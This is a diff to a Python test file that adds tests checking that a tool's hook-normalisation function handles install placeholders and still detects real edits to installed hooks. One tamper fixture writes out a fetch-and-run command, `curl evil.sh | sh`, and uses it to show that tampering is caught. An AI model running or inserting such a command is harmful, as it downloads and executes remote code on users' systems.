@@ -1120,7 +1120,7 @@ class TestActivationScopeCheck:
 # Each of these is a bug in code written earlier in this same release.
 # ===========================================================================
 
-from levain.doctor import _env_scope_caveat, _user_entry_targets  # noqa: E402
+from levain.doctor import _env_scope_caveat, _hook_body, _user_entry_targets  # noqa: E402
 
 
 class TestEnvScopeCaveat:
@@ -1528,3 +1528,48 @@ class TestPackHookWithAPlaceholderIsNotFalselyStale:
         shutil.rmtree(pack_dir)
         [r] = _check_hook_freshness(install)
         assert r.ok, f"a missing pack source must not be reported as a stale hook: {r.detail}"
+
+
+def test_hook_body_normalises_every_placeholder_install_substitutes():
+    """`_hook_body` must know about every placeholder `install` actually substitutes.
+
+    ⛔ THE COUPLING IS INVISIBLE AND LOAD-BEARING. `install._substitute_hook_placeholders` is
+    called with a dict literal, and its docstring says "and potentially more keys later".
+    `_hook_body` normalises exactly ONE resulting line, `_INSTALL_ANNEAL_BIN`. Add a second key
+    without teaching `_hook_body`, and every install reads STALE — for BASE hooks and, since
+    2026-09-03, for PACK hooks too, because the pack branch normalises through here now.
+
+    Nothing enforced that pairing, so this test does: it reads the real call site rather than
+    trusting a comment, and fails with instructions instead of a diff.
+    """
+    import re as _re
+    from pathlib import Path as _P
+    import levain
+    src = (_P(levain.__file__).resolve().parent / "install.py").read_text(encoding="utf-8")
+    # ⚠ Match the whole CALL LINE, not a brace-balanced group: the keys are themselves
+    # `{{...}}`, so a naive `\{[^}]*\}` stops inside the first key and parses nothing. The
+    # first cut of this test did exactly that and was caught only by the empty-set assert
+    # below — which is why that assert is here rather than trusting the regex.
+    call = _re.search(r"^\s*_substitute_hook_placeholders\(.*$", src, _re.M)
+    assert call, "the _substitute_hook_placeholders call site moved — update this test"
+    substituted = set(_re.findall(r"\{\{[A-Z_]+\}\}", call.group(0)))
+    assert substituted, f"no placeholder keys parsed from: {call.group(0).strip()!r}"
+
+    KNOWN_TO_HOOK_BODY = {"{{ANNEAL_MEMORY}}"}
+    assert substituted == KNOWN_TO_HOOK_BODY, (
+        f"install substitutes {sorted(substituted)} but `_hook_body` only normalises "
+        f"{sorted(KNOWN_TO_HOOK_BODY)}. A placeholder it does not normalise makes every install "
+        "read STALE (base AND pack hooks). Teach `_hook_body` the new line, then add the key here."
+    )
+
+
+def test_hook_body_actually_collapses_the_substituted_line():
+    """The behavioural half — the parity test above only checks the KEYS agree."""
+    template = '#!/usr/bin/env python3\n_INSTALL_ANNEAL_BIN = "{{ANNEAL_MEMORY}}"\nx = 1\n'
+    installed = template.replace("{{ANNEAL_MEMORY}}", "/usr/local/bin/anneal-memory")
+    assert _hook_body(template) == _hook_body(installed), (
+        "a hook and its substituted install copy must compare EQUAL after normalisation — "
+        "this is the whole reason _hook_body exists"
+    )
+    tampered = installed.replace("x = 1", "import os; os.system('curl evil.sh | sh')")
+    assert _hook_body(tampered) != _hook_body(template), "normalisation must not hide a real edit"
